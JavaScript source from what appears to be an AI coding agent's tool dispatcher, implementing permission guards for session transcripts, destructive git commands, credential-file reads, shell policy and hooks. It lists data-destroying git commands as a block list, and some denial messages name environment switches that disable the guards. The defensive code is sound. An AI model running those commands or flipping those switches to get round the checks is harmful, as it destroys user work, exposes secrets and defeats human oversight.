  // transcripts under ~/.chainlesschain/sessions are hash-chained and treated
  // as an audit surface — an agent editing a transcript rewrites the history
  // that `cc session verify` and resume trust. Same posture as the
  // sensitive-file guard: confirm-first, an explicit settings `allow` rule is
  // the only bypass, headless without a confirmer fails closed.
  if (
    GUARDED_FILE_MUTATION_TOOLS.has(name) &&
    settingsVerdict.decision !== "allow"
  ) {
    const { sessionStorePathReason } =
      await import("../lib/session-store-guard.js");
    const guarded = fileMutationPaths(name, args)
      .map((candidatePath) => ({
        path: candidatePath,
        reason: sessionStorePathReason(candidatePath, { cwd }),
      }))
      .find((candidate) => candidate.reason);
    if (guarded) {
      const ok = await requestInteractivePermission(name, args, context, cwd, {
        tool: name,
        args,
        rule: null,
        reason: `session store: ${guarded.reason}`,
      });
      if (!ok) {
        return {
          error: `[Session Store] Mutating "${guarded.path}" would modify a session transcript (${guarded.reason}) — denied. Add a settings allow rule to pre-authorize.`,
          policy: { decision: "ask", via: "session-store-guard" },
        };
      }
    }
  }

  // Destructive-git guard (Claude-Code 2.1.183 parity: "destructive git
  // commands blocked when unintended"). The `git` tool otherwise runs any
  // command unguarded in auto mode — including `reset --hard`, `clean -fd`,
  // `restore .`, `push --force`, `branch -D`, `rebase`, `reflog expire` —
  // which irrecoverably discard work. An explicit settings `allow`/confirmed
  // A confirmed `ask` pre-authorizes. A static `allow` only pre-authorizes a
  // linked worktree; primary/unknown checkout identity still needs a live
  // confirmation. Plan mode already blocks non-read-only git below.
  if (
    name === "git" &&
    !planManager.isActive() &&
    isDangerousGitCommand(args?.command)
  ) {
    const checkout = classifyGitCheckout(args?.cwd || cwd);
    const settingsAskWasConfirmed =
      settingsVerdict.decision === "ask" && ruleAllowed;
    const linkedWorktreeWasAllowed = checkout === "linked" && ruleAllowed;
    if (!settingsAskWasConfirmed && !linkedWorktreeWasAllowed) {
      const ok = await requestInteractivePermission(name, args, context, cwd, {
        tool: name,
        args,
        rule: null,
        reason: `destructive git command in ${checkout} checkout: git ${normalizeGitCommand(args.command)}`,
      });
      if (!ok) {
        return {
          error: `[Destructive Git] "git ${normalizeGitCommand(args.command)}" targets the ${checkout} checkout, discards work irrecoverably, and requires live confirmation — denied.`,
          policy: {
            decision: "ask",
            via: "destructive-git",
            checkout,
          },
        };
      }
    }
  }

  // Credential READ guard (Claude-Code 2.1.189 parity: `sandbox.credentials`
  // blocks reads of credential files / secret env vars). cc has no OS sandbox,
  // so the same intent is enforced at the tool layer: pulling the user's secrets
  // into model context is a confirm-first action. `read_file` aimed at a
  // credential file, and `run_shell` commands that cat a credential file or echo
  // a secret env var, are gated. An explicit settings `allow`/confirmed `ask`
  // (ruleAllowed) pre-authorizes; headless without a confirmer fails closed;
  // `CC_CREDENTIAL_GUARD=0` disables it. Unlike --safe-mode (which weakens
  // customizations), this safety surface stays on under --safe-mode by design.
  if (!ruleAllowed && (name === "read_file" || name === "run_shell")) {
    const {
      credentialFileReasonResolved,
      commandReadsCredentials,
      credentialGuardDisabled,
    } = await import("../lib/credential-guard.js");
    if (!credentialGuardDisabled(process.env)) {
      let credReason = null;
      if (name === "read_file" && args?.path) {
        // Resolve symlinks: an innocent-named link to a credential file must not
        // skip the prompt (fs.readFileSync follows the link).
        credReason = credentialFileReasonResolved(args.path, { cwd });
      } else if (name === "run_shell" && args?.command) {
        const hit = commandReadsCredentials(args.command);
        credReason = hit ? hit.reason : null;
      }
      if (credReason) {
        const ok = await requestInteractivePermission(
          name,
          args,
          context,
          cwd,
          {
            tool: name,
            args,
            rule: null,
            reason: `credential access: ${credReason}`,
          },
        );
        if (!ok) {
          const what =
            name === "read_file" ? `Reading "${args.path}"` : "This command";
          return {
            error: `[Credential Guard] ${what} accesses secrets (${credReason}) and requires confirmation — denied. Add a settings allow rule, or set CC_CREDENTIAL_GUARD=0 to bypass.`,
            policy: { decision: "ask", via: "credential-guard" },
          };
        }
      }
    }
  }

  // Subtree rules are an authority input, so the first file mutation in a
  // subtree must observe them before any PreToolUse hook or filesystem effect.
  // Discovery+read commits the complete source/target batch atomically; this
  // call is intentionally deferred once and succeeds only on an explicit retry.
  if (GUARDED_FILE_MUTATION_TOOLS.has(name)) {
    const instructionPreflight = await _preflightMutationSubtreeInstructions(
      fileMutationPaths(name, args),
      cwd,
      context.subtreeInstructionScope || context.sessionId || "__legacy__",
    );
    if (instructionPreflight) return instructionPreflight;
  }

  let shellDispatchPolicyAuthority = null;
  if (name === "run_shell") {
    try {
      const permissionRulesProvider = context.permissionRulesProvider || null;
      const approvalGate = context.approvalGate || null;
      const initialProjection = {
        permission: projectPermissionAuthority({
          authority: permissionAuthority,
          rules: validatePermissionRuleset(effectivePermissionRules),
          tool: name,
          args,
          cwd,
        }),
        host: selectedHostToolPolicy(
          context.hostManagedToolPolicy || null,
          name,
        ),
        plan: snapshotPlanToolAuthority(planManager, name, args),
        effectiveToolSet: snapshotEffectiveToolSetAuthority(
          context.effectiveAllowedToolNames,
          name,
        ),
        toolAdmission: evaluateSelectedToolAdmissionAuthority({
          admission: context.toolAdmission,
          tool: name,
          runtimeDescriptor,
          localToolDescriptor,
          hostManagedToolPolicy: context.hostManagedToolPolicy,
        }).projection,
        approval: snapshotApprovalPolicyAuthority(
          approvalGate,
          context.sessionId || null,
        ),
        unattended: context.unattendedActionPolicy || null,
        shellPolicyOverrides: context.shellPolicyOverrides || null,
        classifyAllShell: context.classifyAllShell === true,
      };
      if (
        digestPolicyAuthority(initialProjection.permission) !==
          admittedPermissionPolicyDigest ||
        digestPolicyAuthority(initialProjection.host) !==
          admittedHostPolicyDigest ||
        digestPolicyAuthority(initialProjection.plan) !==
          admittedPlanPolicyDigest ||
        digestPolicyAuthority(initialProjection.effectiveToolSet) !==
          admittedEffectiveToolSetDigest ||
        digestPolicyAuthority(initialProjection.toolAdmission) !==
          admittedToolAdmissionDigest
      ) {
        const error = new Error(
          "Shell policy authority changed while an earlier confirmation was pending",
        );
        error.code = "CC_SHELL_POLICY_AUTHORITY_CHANGED";
        throw error;
      }
      const initialDigest = digestPolicyAuthority(initialProjection);
      shellDispatchPolicyAuthority = Object.freeze({
        policyVersion: `cc-shell-policy-authority/v1:${initialDigest}`,
        async revalidate() {
          try {
            if (
              (liveExecutionContext.permissionRulesProvider || null) !==
                permissionRulesProvider ||
              (liveExecutionContext.approvalGate || null) !== approvalGate ||
              (liveExecutionContext.planManager || getPlanModeManager()) !==
                planManager
            ) {
              const error = new Error("policy authority provider changed");
              error.code = "CC_SHELL_POLICY_AUTHORITY_CHANGED";
              throw error;
            }
            let currentPermissionAuthority = null;
            let currentPermissionRules =
              liveExecutionContext.permissionRules || null;
            if (permissionRulesProvider) {
              currentPermissionAuthority = await permissionRulesProvider({
                cwd,
                tool: name,
                args,
              });
              currentPermissionRules =
                currentPermissionAuthority?.rules ||
                currentPermissionAuthority ||
                null;
            }
            const currentProjection = {
              permission: projectPermissionAuthority({
                authority: currentPermissionAuthority,
                rules: validatePermissionRuleset(currentPermissionRules),
                tool: name,
                args,
                cwd,
              }),
              host: selectedHostToolPolicy(
                liveExecutionContext.hostManagedToolPolicy || null,
                name,
              ),
              plan: snapshotPlanToolAuthority(planManager, name, args),
              effectiveToolSet: snapshotEffectiveToolSetAuthority(
                liveExecutionContext.effectiveAllowedToolNames,
                name,
              ),
              toolAdmission: evaluateSelectedToolAdmissionAuthority({
                admission: liveExecutionContext.toolAdmission,
                tool: name,
                runtimeDescriptor,
                localToolDescriptor,
                hostManagedToolPolicy:
                  liveExecutionContext.hostManagedToolPolicy,
              }).projection,
              approval: snapshotApprovalPolicyAuthority(
                approvalGate,
                context.sessionId || null,
              ),
              unattended: liveExecutionContext.unattendedActionPolicy || null,
              shellPolicyOverrides:
                liveExecutionContext.shellPolicyOverrides || null,
              classifyAllShell: liveExecutionContext.classifyAllShell === true,
            };
            if (digestPolicyAuthority(currentProjection) !== initialDigest) {
              const error = new Error(
                "Shell permission authority changed after initial admission",
              );
              error.code = "CC_SHELL_POLICY_AUTHORITY_CHANGED";
              throw error;
            }
            return true;
          } catch (error) {
            if (error?.code === "CC_SHELL_POLICY_AUTHORITY_CHANGED") {
              throw error;
            }
            const wrapped = new Error(
              "Current shell permission authority could not be revalidated",
              { cause: error },
            );
            wrapped.code =
              error?.code || "CC_SHELL_POLICY_AUTHORITY_UNAVAILABLE";
            throw wrapped;
          }
        },
      });
    } catch (error) {
      return {
        error:
          "[Shell Dispatch] The current permission authority could not be bound. No command side effect was started.",
        policy: {
          decision: "blocked",
          via: "shell-policy-authority",
          code: error?.code || "CC_SHELL_POLICY_AUTHORITY_UNAVAILABLE",
        },
      };
    }
  }

  // PreToolUse hooks. DB hooks (cc hook add) stay observe-only — a failure
  // never blocks. settings.json hooks (context.settingsHooks) are decision-
  // capable: a `block` (exit 2 / {decision:block}) stops the tool here, an
  // `ask` routes to the confirmer. Runs after permission resolution so a
  // settings deny / host deny short-circuits before any hook process spawns.
  if (!planReadOnlyFenceActive && context.hermeticExecution !== true) {
    const hooksV2Pre = await executeHooksV2Event(
      "PreToolUse",
      {
        schema_version: 1,
        event_id: `evt_${randomUUID().replaceAll("-", "").slice(0, 16)}`,
        session_id: context.sessionId || null,
        turn_id: context.turnId || null,
        tool_use_id: context.toolCallId || null,
        tool_name: name,
        input_keys:
          args && typeof args === "object" ? Object.keys(args).sort() : [],
        cwd,
        ...(context.hookTraceId ? { trace_id: context.hookTraceId } : {}),
        ...(context.hookParentId ? { parent_id: context.hookParentId } : {}),
      },
      {
        failClosed: true,
        settingsHooks: context.settingsHooks,
        hookDb,
        matchTarget: name,
        cwd,
      },
    );
    if (hooksV2Pre.blocked || hooksV2Pre.decision === "block") {
      const blockingHook = hooksV2Pre.results?.find(
        (entry) => entry.decision === "block",
      );
      const blockingReason =
        blockingHook?.result?.reason ||
        hooksV2Pre.blockingResult?.reason ||
        blockingHook?.error ||
        null;
      return {
        error: `[Hook] PreToolUse blocked "${name}"${blockingReason ? `: ${blockingReason}` : ""}`,
        policy: {
          decision: "block",
          via: "hook",
          hook: blockingHook?.hookId || null,
          code:
            hooksV2Pre.errorCode ||
            hooksV2Pre.auditError ||
            hooksV2Pre.blockingResult?.code ||
            null,
        },
      };
    }
    if (hooksV2Pre.requiresApproval || hooksV2Pre.decision === "ask") {
      const askingHook = hooksV2Pre.results?.find(
        (entry) => entry.decision === "ask",
      );
      const reason =
        askingHook?.result?.reason ||
        hooksV2Pre.blockingResult?.reason ||
        "A PreToolUse Hook requests confirmation";
      const ide = await tryIdeDiffApprovalForEdit(name, args, context, cwd, {
        rule: `hook:${askingHook?.hookId || "canonical"}`,
        source: "PreToolUse Hook",
      });
      if (ide?.outcome === "accepted") return ide.result;
      if (ide?.outcome === "rejected" || ide?.outcome === "changes-requested") {
        return ide.result;
      }
      const approved = await requestInteractivePermission(
        name,
        args,
        context,
        cwd,
        {
          tool: name,
          args,
          rule: `hook:${askingHook?.hookId || "canonical"}`,
          reason,
          source: "hooks-v2",
        },
      );
      if (!approved) {
        emitHooksV2Event("PermissionDenied", {
          schema_version: 1,
          session_id: context.sessionId || null,
          turn_id: context.turnId || null,
          tool_use_id: context.toolCallId || null,
          tool_name: name,
          source: "hooks-v2",
        });
        return {
          error: `[Hook] PreToolUse blocked "${name}": confirmation denied`,
          policy: { decision: "deny", via: "hook" },
        };
      }
    }
  }

  let sessionBudgetTool = null;
  if (typeof context.sessionBudget?.beginTool === "function") {
    const toolBinding = JSON.stringify({
      sessionId: context.sessionId || null,
      turnId: context.turnId || null,
      toolCallId: context.toolCallId || randomUUID(),
      tool: name,
    });
    const toolBudgetId = `tool:${createHash("sha256")
      .update(toolBinding, "utf8")
      .digest("hex")
      .slice(0, 48)}`;
    sessionBudgetTool = context.sessionBudget.beginTool({
      id: toolBudgetId,
      kind: String(name || "tool").slice(0, 128),
    });
    if (!sessionBudgetTool?.ok) {
      return {
        error: `Session budget blocked tool execution: ${sessionBudgetTool?.reason || "session-aborted"}`,
        code: "CC_SESSION_BUDGET_EXHAUSTED",
        budgetReason: sessionBudgetTool?.reason || "session-aborted",
        policy: {
          decision: "blocked",
          via: "session-budget",
        },
      };
    }
  }

  const startTime = Date.now();
  let toolResult;
  try {
    toolResult = await executeToolInner(name, args, {
      skillLoader,
      // Subagent skill capability INTERSECT — forwarded to run_skill/list_skills.
      skillAllowlist: context.skillAllowlist ?? null,
      skillOutcomeIndex: context.skillOutcomeIndex,
      skillVectorAuthority: context.skillVectorAuthority,
      skillRetrievalRevocationReader: context.skillRetrievalRevocationReader,
      cwd,
      parentMessages: context.parentMessages,
      interaction: context.interaction,
      sessionId: context.sessionId || null,
      turnId: context.turnId || null,
      toolCallId: context.toolCallId || null,
      workflowEffectId: context.workflowEffectId || null,
      workflowChildEffectId: context.workflowChildEffectId || null,
      workflowChildSequence: context.workflowChildSequence || null,
      workflowEffectProtocol: context.workflowEffectProtocol || null,
      // Parent LLM config — documented at toolContext as forwarded to
      // spawn_sub_agent for provider/key inheritance; without this line it
      // never actually reached executeToolInner (sub-agents silently fell
      // back to config defaults and their usage was mis-attributed).
      llmOptions: context.llmOptions || null,
      // 用量归因: shared per-run sink for child-loop (sub-agent / isolated
      // skill) token usage, drained by agentLoop as attributed events.
      subAgentUsageSink: context.subAgentUsageSink || null,
      strictUsageTelemetry: context.strictUsageTelemetry === true,
      onUsageBoundary: context.onUsageBoundary || null,
      onUsageSettlement: context.onUsageSettlement || null,
      onProviderReceipt: context.onProviderReceipt || null,
      onToolCallBoundary: context.onToolCallBoundary || null,
      onToolCallSettlement: context.onToolCallSettlement || null,
      hookTraceId: context.hookTraceId || null,
      skillLifecycleMode: context.skillLifecycleMode || "active",
      backgroundUsageFailureState: context.backgroundUsageFailureState || null,
      planManager,
      permissionRules: context.permissionRules || null,
      permissionRulesProvider: context.permissionRulesProvider || null,
      effectiveAllowedToolNames: context.effectiveAllowedToolNames ?? null,
      hostManagedToolPolicy: context.hostManagedToolPolicy || null,
      externalToolDescriptors: context.externalToolDescriptors || null,
      externalToolExecutors: context.externalToolExecutors || null,
      mcpClient: context.mcpClient || null,
      mcpHostClient: context.mcpHostClient || context.mcpClient || null,
      mcpCallLedger: context.mcpCallLedger || null,
      mcpConflictScheduler: context.mcpConflictScheduler || null,
      mcpDispatchAdmission: context.mcpDispatchAdmission || null,
      subtreeInstructionScope:
        context.subtreeInstructionScope || context.sessionId || "__legacy__",
      shellPolicyOverrides: context.shellPolicyOverrides || null,
      classifyAllShell: context.classifyAllShell === true,
      nonBlockingShell: context.nonBlockingShell === true,
      approvalGate: context.approvalGate || null,
      shellConfirm: context.shellConfirm || null,
      additionalDirectories: context.additionalDirectories || null,
      sandbox: context.sandbox || null,
      ruleAllowed,
      settingsVerdict,
      shellDispatchPolicyAuthority,
      subAgentDepth: context.subAgentDepth || 0,
      subAgentBudget: context.subAgentBudget || null,
      sessionBudget: context.sessionBudget || null,
      hostResourceBudget: context.hostResourceBudget || null,
      // Effective contract of THIS loop (parent ceiling for a nested spawn) +
      // the MCP tool definitions this loop exposes (inheritable by a spawn).
      subAgentContract: context.subAgentContract || null,
      extraToolDefinitions: context.extraToolDefinitions || null,
      // Parent memory source — forwarded so a memory-granted spawn inherits it.
      memoryDb: context.memoryDb || null,
      permanentMemory: context.permanentMemory || null,
      interactiveApproval: context.interactiveApproval || false,
      settingsHooks: context.settingsHooks || null,
      signal: context.signal || null,
      backgroundSubAgents: context.backgroundSubAgents || null,
      toolAdmission: context.toolAdmission || null,
      unattendedActionPolicy: context.unattendedActionPolicy || null,
      managedCheckpoint: context.managedCheckpoint === true,
      fileMutationScope: context.fileMutationScope || null,
      hermeticExecution: context.hermeticExecution === true,
      browserEvidenceBinding: context.browserEvidenceBinding || null,
      browserOriginGrants: context.browserOriginGrants || null,
      browserExpectedGrantRevisions:
        context.browserExpectedGrantRevisions || null,
      browserReplaySourceEnvelope: context.browserReplaySourceEnvelope || null,
      browserReplayAllowSideEffects:
        context.browserReplayAllowSideEffects === true,
      browserReplayAllowCredentials:
        context.browserReplayAllowCredentials === true,
    });
  } catch (err) {
    if (!planReadOnlyFenceActive && context.hermeticExecution !== true) {
      try {
        await executeHooksV2Event(
          "ToolError",
          {
            tool: name,
            tool_name: name,
            tool_input: args,
            error: err.message,
            cwd,
          },
          {
            hookDb,
            settingsHooks: context.settingsHooks,
            matchTarget: name,
            cwd,
          },
        );
      } catch (error) {
        recordObserveHookIncident("ToolError", "canonical", error);
      }
    }
    throw err;
  } finally {
    sessionBudgetTool?.end?.();
  }

  const durationMs = Date.now() - startTime;
  const status = toolResult?.error ? "error" : "completed";
  const telemetryRecord = createToolTelemetryRecord({
    descriptor: runtimeDescriptor,
    status,
    durationMs,
    sessionId: context.sessionId || null,
    metadata: { args },
  });
  if (toolResult && typeof toolResult === "object") {
    toolResult.toolTelemetryRecord = telemetryRecord;
    if (context.toolAttribution) {
      toolResult.toolAttribution = context.toolAttribution;
    }
  }

  // Canonical PostToolUse dispatch. SQLite and settings definitions are input
  // adapters; Hooks v2 is the only scheduler/decision/audit runtime.
  if (
    !planReadOnlyFenceActive &&
    context.hermeticExecution !== true &&
    toolResult &&
    typeof toolResult === "object"
  ) {
    try {
      const outcome = await executeHooksV2Event(
        "PostToolUse",
        {
          schema_version: 1,
          event_id: `evt_${randomUUID().replaceAll("-", "").slice(0, 16)}`,
          hook_event_name: "PostToolUse",
          tool_name: umbrellaFor(name),
          raw_tool_name: name,
          tool_input: args,
          tool_response: JSON.stringify(toolResult).substring(0, 2000),
          cwd,
          session_id: context.sessionId || null,
          ...(context.hookTraceId ? { trace_id: context.hookTraceId } : {}),
          ...(context.hookParentId ? { parent_id: context.hookParentId } : {}),
        },
        {
          settingsHooks: context.settingsHooks,
          hookDb,
          matchTarget: name,
          cwd,
          asyncDispatcher:
            context.hookSupervisor &&
            typeof context.hookSupervisor.dispatch === "function"
              ? (hook, payload) =>
                  context.hookSupervisor.dispatch(
                    [hook.legacyHook || hook],
                    payload,
                    { cwd, broker },
                  )
              : null,
          skipAsyncWithoutDispatcher: true,
        },
      );
      for (const hookResult of outcome.results || []) {
        if (
          hookResult?.status === "error" &&
          String(hookResult.hookId || "").startsWith("settings:")
        ) {
          recordObserveHookIncident(
            "PostToolUse",
            "settings-command",
            hookResult.error || "hook command failed",
          );
        }
      }
      const feedback = outcome.results?.find(
        (entry) =>
          entry.status === "success" &&
          entry.result &&
          ["block", "deny"].includes(
            String(
              entry.result.decision ||
                entry.result.permissionDecision ||
                entry.result.hookSpecificOutput?.permissionDecision ||
                "",
            ).toLowerCase(),
          ),
      );
      const reason = feedback?.result?.reason;
      if (reason) toolResult.hookFeedback = reason;
    } catch (error) {
      recordObserveHookIncident("PostToolUse", "canonical", error);
    }
  }

  // settings.json SubagentStop hooks: fire when a `spawn_sub_agent` tool call
  // finishes (Claude-Code SubagentStop parity). The subagent has already
  // returned its summary, so this is observe + feedback rather than force-
  // continue: a `block` reason is surfaced to the PARENT agent as hookFeedback
  // so it can react (e.g. re-spawn or adjust), mirroring PostToolUse.
  if (
    name === "spawn_sub_agent" &&
    context.settingsHooks &&
    toolResult &&
    typeof toolResult === "object" &&
    // Background spawns return a "running" handle here — their SubagentStop
    // fires later, when the RESULT is drained into the conversation.
    !(toolResult.background === true && toolResult.status === "running")
  ) {
    try {
      const outcome = await runObserveHooks(
        context.settingsHooks,
        "SubagentStop",
        {
          stop_hook_active: false,
          session_id: context.sessionId || null,
          subagent_response:
            typeof toolResult === "object"
              ? JSON.stringify(toolResult).substring(0, 2000)
              : String(toolResult).substring(0, 2000),
        },
        {
          cwd,
          traceId: context.hookTraceId || null,
          parentId: context.hookParentId || null,
        },
      );
      if (outcome.decision === "block" && outcome.reason) {
        toolResult.hookFeedback = toolResult.hookFeedback
          ? `${toolResult.hookFeedback}\n${outcome.reason}`
          : outcome.reason;
      }
    } catch (error) {
      recordObserveHookIncident("SubagentStop", "settings-command", error);
    }
  }

  // IDE post-edit diagnostics (Claude-Code parity): after a successful file
  // mutation with an IDE bridge connected, pull the editor's fresh
  // error/warning diagnostics for that file into the tool result so the model
  // can fix what it just broke in the same loop. Best-effort, bounded;
  // CC_IDE_CONTEXT=0 disables alongside prompt-time context.
  if (
    (name === "write_file" ||
      name === "edit_file" ||
      name === "edit_file_hashed" ||
      name === "notebook_edit") &&
    toolResult &&
    typeof toolResult === "object" &&
    !toolResult.error &&
    args?.path &&
    (context.mcpHostClient || context.mcpClient) &&
    context.externalToolExecutors
  ) {
    try {
      const { collectIdeDiagnostics, formatIdeDiagnostics } =
        await import("../lib/ide-context.js");
      const diags = await collectIdeDiagnostics(
        {
          mcpClient: context.mcpHostClient || context.mcpClient,
          externalToolExecutors: context.externalToolExecutors,
        },
        path.resolve(cwd, args.path),
      );
      const feedback = formatIdeDiagnostics(diags);
      if (feedback) toolResult.ideDiagnostics = feedback;
    } catch (_err) {
      // diagnostics feedback is optional polish — never fail the tool
    }
  }

  if (
    observeHookIncidents.length > 0 &&
    toolResult &&
    typeof toolResult === "object"
  ) {
    toolResult.hookIncidents = observeHookIncidents;
  }

  return toolResult;
}

/**
 * Write a file then verify the on-disk byte count matches the intended
 * content. Network drives and cloud-synced folders (OneDrive / Dropbox /
 * Google Drive) can silently truncate a write or leave a 0-byte file; without
 * this check the agent reports `success` on a corrupted write and moves on.
 * Parity with Claude-Code 2.1.181 ("Fixed Write/Edit producing 0-byte or
 * truncated files on network drives and cloud-synced folders").
 *
 * Returns `{ size }` (actual on-disk bytes) on success, or `{ error }`
 * describing the truncation so the caller surfaces it as a tool error instead
 * of a false success. `fsImpl` is injectable for unit tests.
 */
export function writeFileVerified(filePath, content, fsImpl = fs) {
  const expected = Buffer.byteLength(content, "utf8");
  fsImpl.writeFileSync(filePath, content, "utf8");
  let actual;
  try {
    actual = fsImpl.statSync(filePath).size;
  } catch (err) {
    return {
      error: `Write verification failed: cannot stat ${filePath} after writing (${err.message}). The file may be on an unreliable network or cloud-synced drive.`,
    };
  }
  if (actual !== expected) {
    return {
      error: `Write truncated: expected ${expected} bytes but only ${actual} reached disk for ${filePath}. A network drive or cloud-sync folder (OneDrive/Dropbox/Google Drive) may have interrupted the write — retry, or write to a local path.`,
    };
  }
  return { size: actual };
}

function writeFileVerifiedWithinExactScope(
  fileMutationScope,
  requestedPath,
  content,
  cwd,
) {
  let scope;
  let relativePath;
  let binding;
  let state;
  try {
    scope = normalizeExactFileMutationScope(fileMutationScope, { cwd });
    relativePath = exactRepoRelativeFilePath(requestedPath);
    binding = scope.bindings.find(
      (candidate) => candidate.relativePath === relativePath,
    );
    if (!binding) throw new Error("path is not in the exact allowed file set");
    state = verifyExactBindingState(scope, binding);
  } catch (error) {
    return {
      error: `[File Mutation Scope] Bound write refused: ${error.message}`,
      policy: {
        decision: "deny",
        via: "exact-file-mutation-scope",
        reason: "path-identity-changed",
      },
    };
  }

  const expected = Buffer.byteLength(content, "utf8");
  let descriptor;
  let temporaryPath;
  let temporaryIdentity;
  let replacementCommitted = false;
  try {
    // Never truncate the bound inode: it may be renamed outside the authorized
    // worktree after the guard. Stage new bytes in the same verified directory
    // and replace only the authorized pathname atomically. A concurrent rename
    // can move the old inode, but cannot turn this write into a mutation of it.
    const source = lstatIdentity(binding.absolutePath);
    if (
      !source.stats.isFile() ||
      source.stats.nlink !== 1n ||
      !sameFilesystemIdentity(source.identity, state.fileIdentity, {
        content: true,
      })
    ) {
      throw new Error("source file no longer matches the bound identity");
    }

    const directory = path.dirname(binding.absolutePath);
    temporaryPath = path.join(
      directory,
      `.chainlesschain-fix-${process.pid}-${randomUUID()}.tmp`,
    );
    const noFollow = fs.constants.O_NOFOLLOW || 0;
    descriptor = fs.openSync(
      temporaryPath,
      fs.constants.O_WRONLY |
        fs.constants.O_CREAT |
        fs.constants.O_EXCL |
        noFollow,
      Number(source.stats.mode & 0o777n),
    );
    const openedTemporary = fs.fstatSync(descriptor, { bigint: true });
    temporaryIdentity = filesystemIdentity(openedTemporary);
    if (!openedTemporary.isFile() || openedTemporary.nlink !== 1n) {
      throw new Error("staged file did not open as one regular file");
    }
    if (process.platform !== "win32") {
      fs.fchmodSync(descriptor, Number(source.stats.mode & 0o777n));
    }
    fs.writeFileSync(descriptor, content, { encoding: "utf8" });
    fs.fsyncSync(descriptor);
    const staged = fs.fstatSync(descriptor, { bigint: true });
    const stagedIdentity = filesystemIdentity(staged);
    if (
      !staged.isFile() ||
      staged.nlink !== 1n ||
      !sameFilesystemIdentity(stagedIdentity, temporaryIdentity) ||
      staged.size !== BigInt(expected)
    ) {
      throw new Error("staged write verification failed");
    }

    // Revalidate both the original binding and the staged pathname immediately
    // before the atomic replacement. O_EXCL plus the descriptor/path identity
    // comparison prevents a pre-created alias from being substituted here.
    verifyExactBindingState(scope, binding);
    const stagedPath = lstatIdentity(temporaryPath);
    const stagedPathMatches =
      process.platform === "win32"
        ? pathMatchesOpenedFileIdentitySync(temporaryPath, staged, {
            stateFields: EXACT_FILE_MUTATION_OPENED_STATE_FIELDS,
          })
        : sameFilesystemIdentity(stagedPath.identity, stagedIdentity, {
            content: true,
          });
    if (
      !stagedPath.stats.isFile() ||
      stagedPath.stats.nlink !== 1n ||
      !stagedPathMatches
    ) {
      throw new Error("staged file path changed identity or content");
    }

    fs.renameSync(temporaryPath, binding.absolutePath);
    replacementCommitted = true;
    temporaryPath = undefined;

    const installed = lstatIdentity(binding.absolutePath);
    verifyExactScopeAncestors(state);
    const installedWriter =
      process.platform === "win32"
        ? fs.fstatSync(descriptor, { bigint: true })
        : staged;
    const installedPathMatches =
      process.platform === "win32"
        ? installedWriter.isFile() &&
          installedWriter.nlink === 1n &&
          sameOpenedFileIdentity(
            staged,
            installedWriter,
            EXACT_FILE_MUTATION_RENAME_STABLE_STATE_FIELDS,
          ) &&
          pathMatchesOpenedFileIdentitySync(
            binding.absolutePath,
            installedWriter,
            {
              stateFields: EXACT_FILE_MUTATION_OPENED_STATE_FIELDS,
            },
          )
        : sameFilesystemIdentity(installed.identity, stagedIdentity, {
            content: true,
          });
    if (
      !installed.stats.isFile() ||
      installed.stats.nlink !== 1n ||
      !installedPathMatches ||
      installed.stats.size !== BigInt(expected)
    ) {
      throw new Error("installed replacement failed identity verification");
    }
    state.fileIdentity = installed.identity;

    // POSIX needs a directory fsync to durably publish the rename. Windows
    // does not support fsync on directory handles through Node.
    if (process.platform !== "win32") {
      const directoryDescriptor = fs.openSync(directory, fs.constants.O_RDONLY);
      try {
        fs.fsyncSync(directoryDescriptor);
      } finally {
        fs.closeSync(directoryDescriptor);
      }
    }
    return { size: Number(installed.stats.size) };
  } catch (error) {
    return {
      error: `[File Mutation Scope] Bound write failed: ${error.message}`,
      ...(replacementCommitted ? { outcomeUnknown: true } : {}),
      ...(temporaryPath
        ? {
            cleanupRequired: true,
            unsettledStage: path.basename(temporaryPath),
          }
        : {}),
      policy: {
        decision: "deny",
        via: "exact-file-mutation-scope",
        reason: replacementCommitted
          ? "bound-write-outcome-unknown"
          : "bound-write-failed",
      },
    };
  } finally {
    if (descriptor !== undefined) {
      try {
        fs.closeSync(descriptor);
      } catch {
        /* the write result already records the authoritative failure */
      }
    }
    // Never unlink a failed staging pathname here. Another process can replace
    // either that entry or its parent between any identity check and unlink;
    // preserving an explicitly reported orphan is safer than deleting an
    // unknown file. A separately authorized identity-aware maintenance pass
    // may reconcile it later.
  }
}

// ── Edit-concurrency (read-freshness) guard ──────────────────────────────
//
// Per-session map: resolved file path → the mtimeMs the agent last OBSERVED for
// it (via read_file, or the write/edit it just made). If a file's on-disk mtime
// is NEWER than that when the agent tries to edit it, an external process wrote
// the file between the agent's read and its edit — so the edit is refused and
// the agent is told to re-read, instead of clobbering the concurrent change on
// top of a stale understanding. A file the agent never observed is NOT blocked
// (first-touch / create stays frictionless). Disable with CC_EDIT_FRESHNESS=0.
const _fileObservedMtimes = new Map();

/** Record the current mtime of a file the agent just read or wrote. */
function _recordFileObservation(filePath, fsImpl = fs) {
  try {
    _fileObservedMtimes.set(filePath, fsImpl.statSync(filePath).mtimeMs);
  } catch {
    /* best-effort — a stat failure just means no freshness baseline */
  }
}

/**
 * Return an error string when `filePath` changed on disk since the agent last
 * observed it (external concurrent edit), else null (fresh, un-observed, or
 * disabled).
 */
function _checkFileFreshness(filePath, fsImpl = fs) {
  if (process.env.CC_EDIT_FRESHNESS === "0") return null;
  const known = _fileObservedMtimes.get(filePath);
  if (known === undefined) return null; // never observed → don't block
  let current;
  try {
    current = fsImpl.statSync(filePath).mtimeMs;
  } catch {
    return null;
  }
  if (current > known) {
    return (
      `File changed on disk since you last read it: ${filePath}. Another ` +
      `process modified it after your last read — re-read the file before ` +
      `editing so your change is based on its current content (this guard ` +
      `prevents silently clobbering a concurrent edit; set CC_EDIT_FRESHNESS=0 ` +
      `to disable).`
    );
  }
  return null;
}

/** Clear the read-freshness map (new session / tests). */
export function _resetFileFreshness() {
  _fileObservedMtimes.clear();
}

// Short, stable-ish id for a freshly inserted notebook cell (nbformat 4.5+).
function _newNotebookCellId() {
  return Math.random().toString(36).slice(2, 10);
}

/**
 * Apply a single cell edit to a Jupyter notebook (.ipynb) given its raw text.
 * Pure (no fs) + exported for tests. Returns `{ text, summary, cellId }` on
 * success or `{ error }` on any validation failure — the caller writes `text`.
 *
 * edit_mode:
 *   - "replace" (default): overwrite the target cell's source; a code cell also
 *     gets outputs=[] + execution_count=null (stale output would be misleading).
 *   - "insert": add a new cell of `cell_type` after the target (or at the top
 *     when no target is given).
 *   - "delete": remove the target cell.
 * Target = cell_id (preferred) or 0-based cell_index.
 */
export function editNotebookCell(notebookText, args = {}) {
  let nb;
  try {
    nb = JSON.parse(notebookText);
  } catch {
    return { error: "Notebook is not valid JSON (.ipynb)" };
  }
